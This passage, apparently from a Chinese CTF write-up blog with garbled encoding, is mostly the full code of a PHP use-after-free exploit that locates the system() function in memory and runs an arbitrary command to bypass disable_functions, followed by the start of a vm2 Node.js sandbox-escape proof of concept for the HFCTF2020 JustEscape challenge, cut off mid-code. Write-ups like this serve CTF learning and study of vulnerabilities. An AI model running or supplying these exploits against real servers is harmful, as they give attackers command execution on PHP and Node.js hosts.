variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment"># PT_LOAD, PF_Read_Write</span>                <span class="token comment"># handle pie</span>                <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment"># PT_LOAD, PF_Read_exec</span>                <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment"># 'constant' constant check</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment"># 'bin2hex' constant check</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment"># ELF header</span>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment"># system</span>                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment"># str_shuffle prevents opcache string interning</span>        <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'A'</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment"># increase this value if UAF fails</span>    <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'A'</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># leaks</span>    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>    <span class="token comment"># fake value</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment"># fake reference</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># fake closure object</span>    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># pwn</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># internal func type</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># internal func handler</span>    <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠŠå‘½ä»¤æ”¹ä¸º/readflagå¹¶ä¸”ä½¿ç”¨èšå‰‘æŠŠpocä¸Šä¼ å¹¶è®¿é—®ï¼ŒæˆåŠŸæ‹¿åˆ°flag</p><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>é¦–é¡µæç¤ºäº†å¯èƒ½ä¸æ˜¯phpå“¦</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-10">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-10</a> 01.09.27.png)</p><p>çœ‹wpè¯´æ˜¯node.js<del>æœ¬äººå®Œå…¨æ²¡æœ‰æ¥è§¦è¿‡</del></p><p>æµ‹è¯•ä½¿ç”¨Error().stackå‡½æ•°ï¼Œå‘ç°ç¡®å®æ˜¯node.jsï¼Œæ˜¯VM2æ²™ç®±é€ƒé€¸ï¼Œ<a href="https://github.com/patriksimek/vm2/issues/225">ç°æˆpoc</a>ç›´æ¥ä½¿ç”¨</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span><span class="token constant">VM</span><span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> untrusted <span class="token operator">=</span> <span class="token string">'('</span> <span class="token operator">+</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    TypeError<span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">prototyp</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">e</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function-variable function">get_process</span> <span class="token operator">=</span> <span class="token parameter">f</span><span class="token operator">=></span>f<span class="token punctuation">.</span><span class="token 